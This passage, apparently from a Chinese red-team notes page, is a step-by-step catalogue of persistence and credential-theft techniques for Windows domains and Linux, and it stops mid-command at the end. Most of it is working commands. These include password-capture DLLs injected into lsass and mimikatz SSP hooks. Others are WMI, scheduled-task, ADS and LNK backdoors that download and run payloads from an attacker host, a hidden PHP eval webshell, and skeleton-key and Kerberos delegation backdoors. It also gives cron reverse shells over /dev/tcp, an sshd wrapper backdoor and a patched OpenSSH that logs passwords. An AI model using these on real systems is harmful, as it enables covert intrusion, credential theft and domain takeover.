HookPasswordChangeNotify</h3>\n<pre><code>使用VS2015开发环境，MFC设置为在静态库中使用MFC\n编译工程，生成HookPasswordChange.dll\nhttps://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1\n在代码尾部添加如下代码：\n&gt;Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass\n并命名为HookPasswordChangeNotify.ps1\n上传HookPasswordChangeNotify.ps1和HookPasswordChange.dll\n管理员权限执行\n&gt;PowerShell.exe -ExecutionPolicy Bypass -File HookPasswordChangeNotify.ps1\nC:\\Windows\\Temp下可以找到passwords.txt\n&amp;\nhttps://gitee.com/RichChigga/PasswordchangeNotify\n上传HookPasswordChangeNotify.ps1和HookPasswordChange.dll 管理员权限执行：\n&gt;PowerShell.exe -ExecutionPolicy Bypass -File HookPasswordChangeNotify.ps1\n在C:\\Windows\\System32 新建文件system.ini第一行是连接的ip 第二行是端口\n</code></pre>\n<p><img data-src=\"520.png\" alt=\"\" /></p>\n<h3 id=\"nppspy记录密码\"><a class=\"anchor\" href=\"#nppspy记录密码\">#</a> NPPSpy 记录密码</h3>\n<pre><code>https://github.com/gtworek/PSBits/blob/master/PasswordStealing/NPPSpy/NPPSPy.c\n默认保存位置是C盘根目录，可以修改重新编译\n</code></pre>\n<p><img data-src=\"729.png\" alt=\"\" /></p>\n<pre><code>将DLL放入system32文件夹内\n</code></pre>\n<p><img data-src=\"730.png\" alt=\"\" /></p>\n<pre><code>执行ps1脚本自动添加注册表\n</code></pre>\n<p><img data-src=\"731.png\" alt=\"\" /></p>\n<pre><code>无需重启\n</code></pre>\n<p><img data-src=\"732.png\" alt=\"\" /></p>\n<h3 id=\"password-filter-dll\"><a class=\"anchor\" href=\"#password-filter-dll\">#</a> Password Filter DLL</h3>\n<pre><code>https://github.com/3gstudent/PasswordFilter\nvisualstudio生成解决方案\nDLL放在%windir%\\system32\\下\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa下的Notification Packages，添加Win32Project3\n</code></pre>\n<p><img data-src=\"521.png\" alt=\"\" /></p>\n<pre><code>&gt;REG QUERY &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa&quot; /v &quot;Notification Packages&quot;\n&gt;REG ADD &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa&quot; /v &quot;Notification Packages&quot; /t REG_MULTI_SZ /d &quot;scecli\\0rassfm\\0Win32Project3&quot; /f\n重启之后只要修改用户的密码，即可记录\n</code></pre>\n<p><img data-src=\"522.png\" alt=\"\" /></p>\n<pre><code>文件默认在C盘根目录，可在源码中修改\n</code></pre>\n<p><img data-src=\"523.png\" alt=\"\" /></p>\n<h3 id=\"wmic事件订阅\"><a class=\"anchor\" href=\"#wmic事件订阅\">#</a> WMIC 事件订阅</h3>\n<pre><code>每隔30秒加载一次payload\n&gt;wmic /NAMESPACE:&quot;\\\\root\\subscription&quot; PATH __EventFilter CREATE Name=&quot;BotFilter82&quot;, EventNameSpace=&quot;root\\cimv2&quot;,QueryLanguage=&quot;WQL&quot;, Query=&quot;SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'&quot;\n&gt;wmic /NAMESPACE:&quot;\\\\root\\subscription&quot; PATH CommandLineEventConsumer CREATE Name=&quot;BotConsumer23&quot;,CommandLineTemplate=&quot;远程调用(powershell,regsvr32,mshta等)&quot;\n&gt;wmic /NAMESPACE:&quot;\\\\root\\subscription&quot; PATH __FilterToConsumerBinding CREATE Filter=&quot;__EventFilter.Name=\\&quot;BotFilter82\\&quot;&quot;, Consumer=&quot;CommandLineEventConsumer.Name=\\&quot;BotConsumer23\\&quot;&quot;\n</code></pre>\n<p><img data-src=\"524.png\" alt=\"\" /></p>\n<pre><code>重启维持\n卸载后门\n&gt;Get-WMIObject -Namespace root\\Subscription -Class __EventFilter -Filter &quot;Name='BotFilter82'&quot; | Remove-WmiObject -Verbose\n&gt;Get-WMIObject -Namespace root\\Subscription -Class CommandLineEventConsumer -Filter &quot;Name='BotConsumer23'&quot; | Remove-WmiObject -Verbose\n&gt;Get-WMIObject -Namespace root\\Subscription -Class __FilterToConsumerBinding -Filter &quot;__Path LIKE '%BotFilter82%'&quot; | Remove-WmiObject -Verbose\n</code></pre>\n<h3 id=\"wmi-persistence\"><a class=\"anchor\" href=\"#wmi-persistence\">#</a> WMI-Persistence</h3>\n<pre><code>https://gitee.com/RichChigga/WMI-Persistence\ncobalt strike -&gt;payload generator-&gt;powershell(use x64)\n</code></pre>\n<p><img data-src=\"525.png\" alt=\"\" /></p>\n<pre><code>attack-&gt;文件下载，文件选择payload generator的脚本，local uri为随意文件\n</code></pre>\n<p><img data-src=\"526.png\" alt=\"\" /></p>\n<pre><code>生成后地址替换进WMI-Persistence脚本内\n</code></pre>\n<p><img data-src=\"527.png\" alt=\"\" /></p>\n<pre><code># powershell -exec bypass\nPS &gt; Import-Module .\\WMI-Persistence.ps1\nPS &gt; Install-Persistence\n</code></pre>\n<p><img data-src=\"528.png\" alt=\"\" /></p>\n<pre><code>PS &gt; Check-WMI  重启后即可上线system权限(要等待4-6分钟)\n</code></pre>\n<p><img data-src=\"529.png\" alt=\"\" /></p>\n<pre><code>自定义上线\n</code></pre>\n<p><img data-src=\"530.png\" alt=\"\" /></p>\n<pre><code>attack-&gt;文件下载，exe木马指定为文件。local uri为随意文件，wmi.xsl放在web目录\n</code></pre>\n<p><img data-src=\"531.png\" alt=\"\" /></p>\n<pre><code>修改wmi.xsl\n</code></pre>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token prolog\">&lt;?xml version='1.0'?></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>stylesheet</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token attr-name\">xmlns</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://www.w3.org/1999/XSL/Transform<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\"><span class=\"token namespace\">xmlns:</span>ms</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>urn:schemas-microsoft-com:xslt<span class=\"token punctuation\">\"</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token attr-name\"><span class=\"token namespace\">xmlns:</span>user</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>placeholder<span class=\"token punctuation\">\"</span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token attr-name\">version</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>1.0<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>output</span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">/></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span><span class=\"token namespace\">ms:</span>script</span> <span class=\"token attr-name\">implements-prefix</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>user<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">language</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>JScript<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token cdata\">&lt;![CDATA[</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    var r = new ActiveXObject(\"WScript.Shell\").Run(\"cmd.exe /c certutil -urlcache -split -f http://192.168.0.107/load.jpg %temp%/load.exe &amp; %temp%/load.exe &amp; certutil.exe -urlcache -split -f http://192.168.0.107/load.jpg delete\",0);</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    ]]></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span><span class=\"token namespace\">ms:</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>stylesheet</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p><img data-src=\"532.png\" alt=\"\" /></p>\n<pre><code>WMI-Persistence脚本修改payload地址为wmi.xsl\n$finalPayload=&quot; wmic os get /FORMAT:`&quot;$Payload`&quot;&quot;\n</code></pre>\n<p><img data-src=\"533.png\" alt=\"\" /></p>\n<pre><code>&gt;powershell -exec bypass\nPS &gt; Import-Module .\\WMI-Persistence.ps1\nPS &gt; Install-Persistence\nPS &gt; Check-WMI\nPS &gt; Remove-Persistence 删除模块\n重启后即可上线\n</code></pre>\n<p><img data-src=\"534.png\" alt=\"\" /></p>\n<h3 id=\"invoke-tasksbackdoor\"><a class=\"anchor\" href=\"#invoke-tasksbackdoor\">#</a> Invoke-Tasksbackdoor</h3>\n<pre><code>&gt;powershell.exe -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.103/Invoke-taskBackdoor.ps1');Invoke-Tasksbackdoor -method nccat -ip 192.168.0.103 -port 9999 -time 2&quot;\n&gt; powershell.exe -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.103/Invoke-taskBackdoor.ps1');Invoke-Tasksbackdoor -method msf -ip 192.168.0.103 -port 8081 -time 2&quot;\n</code></pre>\n<p><img data-src=\"535.png\" alt=\"\" /></p>\n<h3 id=\"invoke-adsbackdoor\"><a class=\"anchor\" href=\"#invoke-adsbackdoor\">#</a> Invoke-ADSBackdoor</h3>\n<pre><code>使用ADS创建一个隐藏文件，创建一个计划任务每隔一分钟请求一次攻击。\n&gt;powershell.exe -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/nishang/Backdoors/Invoke-ADSBackdoor.ps1'); Invoke-ADSBackdoor -PayloadURL http://192.168.0.107/ps/Schtasks-Backdoor.ps1 -Arguments 'Invoke-Tasksbackdoor -method nccat -ip 192.168.0.107 -port 12138 -time 1'&quot;\n</code></pre>\n<p><img data-src=\"536.png\" alt=\"\" /><br />\n<img data-src=\"537.png\" alt=\"\" /><br />\n<img data-src=\"538.png\" alt=\"\" /><br />\n生成<br />\n &gt; msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.107 LPORT=12138 -f powershell -o /var/www/html/ads<br />\n#use exploit/multi/handler<br />\n#set payload windows/x64/meterpreter/reverse_https<br />\n#run</p>\n<h3 id=\"ads隐藏webshell\"><a class=\"anchor\" href=\"#ads隐藏webshell\">#</a> ADS 隐藏 webshell</h3>\n<pre><code>指定宿主文件，index.php是网页正常文件\n&gt;echo ^&lt;?php @eval($_POST['chopper']);?^&gt; &gt; index.php:hidden.jpg\n&lt;?php include(‘index.php:hidden.jpg’)?&gt;\n&lt;?php \n$a=&quot;696E6465782E7068703&quot;.&quot;A68696464656E2E6A7067&quot;;#hex编码\n$b=&quot;a&quot;;\ninclude(PACK('H*',$$b))\n?&gt;\n&gt;echo 9527 &gt; 1.txt:flag.txt\n&gt;notepad 1.txt:flag.txt\n或不指定宿主文件\n&gt;echo hide &gt; :key.txt\n&gt;cd ../\n&gt;notepad test:key.txt\n上传处绕过\n</code></pre>\n<table>\n<thead>\n<tr>\n<th>上传的文件名</th>\n<th>服务器表面现象</th>\n<th>生成的文件内容</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>test.php:a.jpg</td>\n<td>生成 test.php</td>\n<td>空</td>\n</tr>\n<tr>\n<td>test.php::$DATA</td>\n<td>生成 test.php</td>\n<td><?php phpinfo();?></td>\n</tr>\n<tr>\n<td>test.php::$INDEX_ALLOCATION</td>\n<td>生成 test.php 文件夹</td>\n<td>\\</td>\n</tr>\n<tr>\n<td>test.php::$DATA\\0.jpg</td>\n<td>生成 0.jpg</td>\n<td><?php phpinfo();?></td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"adsjavascript\"><a class=\"anchor\" href=\"#adsjavascript\">#</a> ADS&amp;JavaScript</h3>\n<pre><code>创建一个txt文件，test.txt，随便添加内容（实际的工具，即用户要用的那个工具）。\n将程序写入文件流（此处用calc.exe）\n&gt;type calc.exe &gt; test.txt:calc.exe\n使用mklink创建文件链接：\n&gt;mklink config.txt test.txt:calc.exe\n创建readme.txt，文件内容随便。设置为隐藏。\n创建readme.js，内容如下：\nvar objShell = new ActiveXObject(&quot;shell.application&quot;);\nobjShell.ShellExecute(&quot;cmd.exe&quot;, &quot;/c config.txt&quot;, &quot;&quot;, &quot;open&quot;, 0);\nobjShell.ShellExecute(&quot;README.txt&quot;, &quot;&quot;, &quot;&quot;, &quot;open&quot;, 1);\n执行readme.js，运行calc.exe ，打开readme.txt\n</code></pre>\n<h3 id=\"empire-4\"><a class=\"anchor\" href=\"#empire-4\">#</a> Empire</h3>\n<h2 id=\"-611\"><a class=\"anchor\" href=\"#-611\">#</a> </h2>\n<h2 id=\"lnk后门\"><a class=\"anchor\" href=\"#lnk后门\">#</a> LNK 后门</h2>\n<pre><code>Empire\nEmpire&gt; set Host http://192.168.1.150\nEmpire&gt; set Port 8080\n&gt;launcher powershell Listener's Name\n生成后只使用Base64的代码。\n&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/Invoke-BackdoorLNK.ps1');Invoke-BackdoorLNK -LNKPath 'C:\\Users\\Administrator.DC\\Desktop\\Easy CHM.lnk' -EncScript Base64编码&quot;\n</code></pre>\n<p><img data-src=\"539.png\" alt=\"\" /><br />\n<img data-src=\"540.png\" alt=\"\" /><br />\n<img data-src=\"541.png\" alt=\"\" /><br />\n<img data-src=\"542.png\" alt=\"\" /></p>\n<pre><code>清除后门\n&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/Invoke-BackdoorLNK.ps1');Invoke-BackdoorLNK -LNKPath 'C:\\Users\\Administrator.DC\\Desktop\\Easy CHM.lnk' -CleanUp&quot;\n</code></pre>\n<p><img data-src=\"543.png\" alt=\"\" /></p>\n<h2 id=\"-612\"><a class=\"anchor\" href=\"#-612\">#</a> </h2>\n<h2 id=\"wmi-4\"><a class=\"anchor\" href=\"#wmi-4\">#</a> WMI</h2>\n<pre><code>Empire&gt;powershell/persistence/elevated/wmi\n</code></pre>\n<h3 id=\"注入ssp被动收集密码\"><a class=\"anchor\" href=\"#注入ssp被动收集密码\">#</a> 注入 SSP 被动收集密码</h3>\n<pre><code>需高权限\n</code></pre>\n<h2 id=\"-613\"><a class=\"anchor\" href=\"#-613\">#</a> </h2>\n<h2 id=\"mimikatz-4\"><a class=\"anchor\" href=\"#mimikatz-4\">#</a> Mimikatz</h2>\n<pre><code>重启失效\n&gt;privilege::debug\n&gt;misc::memssp\n锁屏\n&gt;rundll32.exe user32.dll,LockWorkStation\n</code></pre>\n<p><img data-src=\"544.png\" alt=\"\" /></p>\n<pre><code>登录的账号密码保存在\nC:\\Windows\\System32\\mimilsa.log\n</code></pre>\n<p><img data-src=\"545.png\" alt=\"\" /></p>\n<pre><code>重启有效\n将mimikatz中的mimilib.dll放入system32目录\n&gt;reg query hklm\\system\\currentcontrolset\\control\\lsa\\ /v &quot;Security Packages&quot; 查看注册表\n&gt;reg add &quot;hklm\\system\\currentcontrolset\\control\\lsa\\&quot; /v &quot;Security Packages&quot; /d &quot;kerberos\\0msv1_0\\0schannel\\0wdigest\\0tspkg\\0pku2u\\0mimilib&quot; /t REG_MULTI_SZ  添加mimilib\n</code></pre>\n<p><img data-src=\"546.png\" alt=\"\" /></p>\n<pre><code>有账号登录密码保存在C:\\Windows\\System32\\kiwissp.log重启也有效\n</code></pre>\n<p><img data-src=\"547.png\" alt=\"\" /></p>\n<h2 id=\"-614\"><a class=\"anchor\" href=\"#-614\">#</a> </h2>\n<h2 id=\"empire-5\"><a class=\"anchor\" href=\"#empire-5\">#</a> Empire</h2>\n<pre><code>复制mimilib.dll到system32文件夹中\n&gt;shell copy mimilib.dll C:\\Windows\\System32\\\n使用模块\n&gt;usemodule persistence/misc/install_ssp*\n&gt;set Path C:\\Users\\Administrator\\mimilib.dll\n</code></pre>\n<h2 id=\"-615\"><a class=\"anchor\" href=\"#-615\">#</a> </h2>\n<h2 id=\"powersploit-3\"><a class=\"anchor\" href=\"#powersploit-3\">#</a> Powersploit</h2>\n<pre><code>&gt;Import-Module .\\PowerSploit.psm1\n&gt;Install-SSP -Path .\\mimilib.dll\n</code></pre>\n<h3 id=\"基于域策略文件权限后门\"><a class=\"anchor\" href=\"#基于域策略文件权限后门\">#</a> 基于域策略文件权限后门</h3>\n<pre><code>域的组策略和脚本存放在域控机的C:\\Windows\\SYSVOL\\sysvol\\zone.com\\Policies目录，域内机器定时访问以更新策略\n域控机设置policies为everyone完全控制\n&gt;cacls C:\\Windows\\SYSVOL\\sysvol\\zone.com\\Policies /e /t /c /g &quot;EveryOne&quot;:f\n</code></pre>\n<p><img data-src=\"548.png\" alt=\"\" /></p>\n<pre><code>使用powerview查询域内机对应策略文件\nPS&gt; Get-NETGPO -ComputerName sub2k8.zone.com |fl gpcfilesyspath\n打开C:\\Windows\\SYSVOL\\sysvol\\zone.com\\Policies\\&#123;id&#125;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf末尾添加\n[Registry Values] MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskhost.exe\\Debugger=1,c:\\windows\\system32\\calc.exe [Version] signature=&quot;$CHICAGO$&quot; Revision=1\n手动刷新策略\n&gt;gpupdate /force\n劫持taskhost.exe，可替换c:\\windows\\system32\\calc.exe为后门文件或语句。\n</code></pre>\n<h3 id=\"kerberoasting后门\"><a class=\"anchor\" href=\"#kerberoasting后门\">#</a> Kerberoasting 后门</h3>\n<pre><code>当有setspn权限时，为域用户添加一个SPN\n&gt;setspn -U -A RDP/zone.com godadmin\n</code></pre>\n<p><img data-src=\"549.png\" alt=\"\" /></p>\n<pre><code>域内任何主机可以使用Kerberoast 获得TGS\nhttps://github.com/malachitheninja/Invoke-Kerberoast\n</code></pre>\n<p><img data-src=\"550.png\" alt=\"\" /></p>\n<pre><code>&gt;Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation |Out-File xx.txt\n</code></pre>\n<p><img data-src=\"551.png\" alt=\"\" /></p>\n<pre><code>或使用rubeus.exe\n</code></pre>\n<p><img data-src=\"552.png\" alt=\"\" /></p>\n<pre><code>破解\n&gt;hashcat -m 13100 -a 0 kerberos.txt wordlist.txt\n</code></pre>\n<h3 id=\"s4u2self后门\"><a class=\"anchor\" href=\"#s4u2self后门\">#</a> S4U2Self 后门</h3>\n<pre><code>域控执行，寻找具备SPN且密码永不过期的账户\n&gt;Get-ADUser -Filter * -Properties ServicePrincipalName,PasswordNeverExpires| ? &#123;($_.ServicePrincipalName -ne &quot;&quot;) -and ($_.PasswordNeverExpires -eq $true)&#125;\n</code></pre>\n<p><img data-src=\"553.png\" alt=\"\" /></p>\n<pre><code>使用mimikatz的dcsync提取用户hash\n&gt;lsadump::dcsync /domain:zone.com /user:y\n</code></pre>\n<p><img data-src=\"554.png\" alt=\"\" /></p>\n<pre><code>布置后门\n&gt;Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount 账户\n</code></pre>\n<p><img data-src=\"555.png\" alt=\"\" /></p>\n<pre><code>布置完成后利用，登录账户y\n触发后门\n&gt;Rubeus.exe s4u /user:y /aes256:&#123;aes256&#125; /domain:zone.com /msdsspn:krbtgt /impersonateuser:godadmin\n</code></pre>\n<p><img data-src=\"556.png\" alt=\"\" /></p>\n<pre><code>注入票据，获取域控的CIFS、LDAP服务\n&gt;Rubeus.exe asktgs /ticket:&#123;&#125; /service:cifs/dc.zone.com,ldap/dc.zone.com /ptt\n</code></pre>\n<p><img data-src=\"557.png\" alt=\"\" /><br />\n<img data-src=\"558.png\" alt=\"\" /><br />\n<img data-src=\"559.png\" alt=\"\" /><br />\n<img data-src=\"560.png\" alt=\"\" /></p>\n<h3 id=\"受限委派后门\"><a class=\"anchor\" href=\"#受限委派后门\">#</a> 受限委派后门</h3>\n<pre><code>http://192.168.0.107/ps/nishang/ActiveDirectory/Add-ConstrainedDelegationBackdoor.ps1\n新增一个受限委派服务账户，或添加受限委派后门功能给一个已知账户密码存在的服务账户。\n需运行在域控制器上，本次演示的是新建后门账户，若是给已知账户密码的服务账户添加功能，步骤一致。\nPS &gt; Add-ConstrainedDelegationBackdoor -SamAccountName backdoor -Domain zone.com -AllowedToDelegateTo ldap/dc.zone.com\n密码默认为Password@123!可以修改脚本中$Password参数修改密码。\n</code></pre>\n<p><img data-src=\"561.png\" alt=\"\" /><br />\n<img data-src=\"562.png\" alt=\"\" /></p>\n<pre><code>https://github.com/samratashok/ADModule\n导入ADModule中的Microsoft.ActiveDirectory.Management.dll和Import-ActiveDirectory.ps1\n&gt;Import-Module Microsoft.ActiveDirectory.Management.dll -Verbose\n&gt;Import-Module Import-ActiveDirectory.ps1\n现以域内普通用户y登录一台域内机器sub2k8，使用kekeo获取TGT\nKekeo#tgt::ask /user:backdoor /domain:zone.com /password:Passowrd@123!\n</code></pre>\n<p><img data-src=\"563.png\" alt=\"\" /></p>\n<pre><code>Kekeo#tgs::s4u /tgt:TGT_backdoor@ZONE.COM_krbtgt~zone.com@ZONE.COM.kirbi /user:godadmin@zone.com /service:ldap/dc.zone.com获取以域管理身份访问ldap的TGS \n</code></pre>\n<p><img data-src=\"564.png\" alt=\"\" /></p>\n<pre><code>使用mimikatz写入TGS票据\nmimikatz#kerberos::ptt C:\\Users\\y.ZONE\\Desktop\\kekeo\\x64\\TGS_godadmin@zone.com@ZONE.COM_ldap~dc.zone.com@ZONE.COM.kirbi\n</code></pre>\n<p><img data-src=\"565.png\" alt=\"\" /></p>\n<pre><code>接下来就可以dcsync导出krbtgt的hash，通过krbtgt伪造黄金票据\nmimikatz#lsadump::dcsync /user:krbtgt /domain:zone.com\n</code></pre>\n<p><img data-src=\"566.png\" alt=\"\" /></p>\n<h3 id=\"skeleton-key万能钥匙\"><a class=\"anchor\" href=\"#skeleton-key万能钥匙\">#</a> Skeleton Key 万能钥匙</h3>\n<pre><code>域控上使用mimikatz执行\n&gt;privilege::debug\n&gt;misc::skeleton\n</code></pre>\n<p><img data-src=\"567.png\" alt=\"\" /></p>\n<pre><code>可以使用域内任何账号以密码mimikatz登录任意域内主机\n使用Empire模块\n&gt;usemodule persistence/misc/skeleton_key*\n绕过LSA Protection\n&gt;privilege::debug\n&gt;!+\n&gt;!processprotect /process:lsass.exe /remove\n&gt;misc::skeleton\n</code></pre>\n<h3 id=\"唯一ip访问\"><a class=\"anchor\" href=\"#唯一ip访问\">#</a> 唯一 IP 访问</h3>\n<pre><code>&gt;msfvenom -p windows/shell_hidden_bind_tcp LPORT=443 AHOST=192.168.0.107 -f exe &gt; svchost.exe\n只有当107这台机器连接时可获得shell，其他机器不可以。\n</code></pre>\n<p><img data-src=\"568.png\" alt=\"\" /><br />\n<img data-src=\"569.png\" alt=\"\" /><br />\n<img data-src=\"570.png\" alt=\"\" /></p>\n<h3 id=\"linux-cron后门\"><a class=\"anchor\" href=\"#linux-cron后门\">#</a> Linux cron 后门</h3>\n<pre><code>&gt;msfvenom -p cmd/unix/reverse_bash LHOST=192.168.0.107 LPORT=12138 -f raw &gt; /var/www/html/shell.sh\n(crontab -l;printf &quot;*/1 * * * * /bin/bash /tmp/shell.sh;/bin/bash --noprofile -i;\\rno crontab for `whoami`%100c\\n&quot;)|crontab -\n</code></pre>\n<p><img data-src=\"571.png\" alt=\"\" /></p>\n<pre><code>#!bash\n(crontab -l;printf &quot;*/60 * * * * exec 9&lt;&gt; /dev/tcp/192.168.1.1/53;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\\rno crontab for `whoami`%100c\\n&quot;)|crontab -\n</code></pre>\n<h3 id=\"strace记录ssh密码\"><a class=\"anchor\" href=\"#strace记录ssh密码\">#</a> Strace 记录 ssh 密码</h3>\n<pre><code>安装strace\n#apt-get install strace\n#vi ~/.bashrc\n添加\nalias ssh='strace -o /tmp/.log -e read,write,connect -s 2048 ssh'\n</code></pre>\n<h3 id=\"sshd后门\"><a class=\"anchor\" href=\"#sshd后门\">#</a> SSHD 后门</h3>\n<pre><code>&gt;ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337;\n执行后开启31337端口，使用root任意密码登录\n&gt;ssh root@192.168.1.1 -p 31337\n</code></pre>\n<h3 id=\"进程注入-2\"><a class=\"anchor\" href=\"#进程注入-2\">#</a> 进程注入</h3>\n<pre><code>http://cymothoa.sourceforge.net/\n靶机&gt;./cymothoa -p 进程PID -s 1 -y 端口\n攻击机&gt;nc -vv ip 端口\n</code></pre>\n<h3 id=\"ssh-wrapper后门\"><a class=\"anchor\" href=\"#ssh-wrapper后门\">#</a> SSH wrapper 后门</h3>\n<pre><code>#cd /usr/sbin\n#mv sshd ../bin\n#echo '#!/usr/bin/perl' &gt;sshd\n#echo 'exec &quot;/bin/sh&quot; if (getpeername(STDIN) =~ /^..4A/);' &gt;&gt;sshd\n#echo 'exec &#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,' &gt;&gt;sshd\n#chmod u+x sshd\n#/etc/init.d/sshd restart\n攻击机执行\n&gt;socat STDIO TCP4:192.168.0.110:22,sourceport=13377\n</code></pre>\n<p><img data-src=\"572.png\" alt=\"\" /></p>\n<h3 id=\"suid-shell\"><a class=\"anchor\" href=\"#suid-shell\">#</a> SUID Shell</h3>\n<pre><code>&gt;cp /bin/bash /tmp/tmp\n&gt;chmod u+s /tmp/tmp\n&gt;/tmp/tmp -p\n</code></pre>\n<h3 id=\"ssh公私钥登录\"><a class=\"anchor\" href=\"#ssh公私钥登录\">#</a> SSH 公私钥登录</h3>\n<pre><code>&gt;vim /etc/ssh/sshd_conf取消以下注释\n</code></pre>\n<p><img data-src=\"573.png\" alt=\"\" /></p>\n<pre><code>&gt;ssh-keygen生成\n复制/root/.ssh/id_rsa.pub文件到攻击端的/root/.ssh/authorized_keys\n&gt;ssh -i id_rsa targer@1.1.1.1\n</code></pre>\n<h3 id=\"reptile\"><a class=\"anchor\" href=\"#reptile\">#</a> Reptile</h3>\n<pre><code>https://github.com/f0rb1dd3n/Reptile\n安装\n&gt;apt install build-essential libncurses-dev linux-headers-$(uname -r)\n&gt;git clone https://github.com/f0rb1dd3n/Reptile.git\n</code></pre>\n<h3 id=\"kbeast_rootkit\"><a class=\"anchor\" href=\"#kbeast_rootkit\">#</a> Kbeast_rootkit</h3>\n<pre><code>http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz\nversion - 0 : 2.6.18 (RHEL/CentOS 5.x)\n      \t1 : 2.6.32 (Ubuntu 10.x) [default version]\n修改配置config.h\n安装路径、日志路径、端口、连接密码、连接用户\n</code></pre>\n<p><img data-src=\"574.png\" alt=\"\" /></p>\n<pre><code>./setup build\n攻击机连接\n&gt;telnet 192.168.1.1 13377\n</code></pre>\n<h3 id=\"openssh后门\"><a class=\"anchor\" href=\"#openssh后门\">#</a> OpenSSH 后门</h3>\n<pre><code>下载\nhttp://ftp.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gz\nhttp://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz\n备份配置文件\n&gt;mv /etc/ssh/ssh_config /etc/ssh/ssh_config.old\n&gt;mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old\n安装关联文件\ncentos\n&gt;yum install -y openssl openssl-devel pam-devel zlib zlib-devel\nUbuntu\n&gt;apt-get install -y openssl libssl-dev libpam0g-dev\n&gt;tar zxvf openssh-5.9p1.tar.gz \n&gt;tar zxvf 0x06-openssh-5.9p1.patch.tar.gz \n&gt;cp openssh-5.9p1.patch/sshbd5.9p1.diff openssh-5.9p1/\n&gt;cd openssh-5.9p1\n&gt;patch &lt;sshbd5.9p1.diff\n&gt;vim includes.h\n</code></pre>\n<p><img data-src=\"575.png\" alt=\"\" /></p>\n<pre><code>/tmp/ilog记录登录到本机的用户密码\n/tmp/olog记录本机登录其他机器的账户密码\n日志文件前可以加个.隐藏起来\nSECRETPW是连接后门密码\n查看当前版本\n&gt;ssh -V\n</code></pre>\n<p><img data-src=\"576.png\" alt=\"\" /></p>\n<pre><code>修改version.h改为当前版本\n</code></pre>\n<p><img data-src=\"577.png\" alt=\"\" /></p>\n<pre><code>编译安装\nCentos7\n&gt;./configure --prefix=/usr/ --sysconfdir=/etc/ssh/ --with-pam --with-kerberos5\n&gt;make clean\n&gt;make &amp;&amp; make install\n&gt;systemctl restart sshd.service\nubuntu\n&gt;./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam\n&gt;make clean\n&gt;make&amp;&amp;make install\n重启服务，修改文件日志\n&gt;touch -r/etc/ssh/ssh_config.old 